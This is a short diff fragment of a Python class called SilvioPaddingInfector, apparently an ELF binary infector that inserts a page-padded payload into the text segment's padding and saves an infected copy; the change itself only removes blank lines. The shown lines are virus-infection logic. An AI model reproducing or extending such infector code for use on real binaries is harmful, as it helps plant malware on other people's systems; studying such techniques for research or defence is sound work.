@@ -45,9 +45,3 @@ class SilvioPaddingInfector(Infector):
 		elf_obj.file_content += payload.ljust(PAGESIZE, b'\xcc')
 		elf_obj.file_content += new_file_content[text_phdr['p_offset'] + original_text_filesz:]
 		elf_obj.save_as(infected_name)
-
-
-
-
-
-
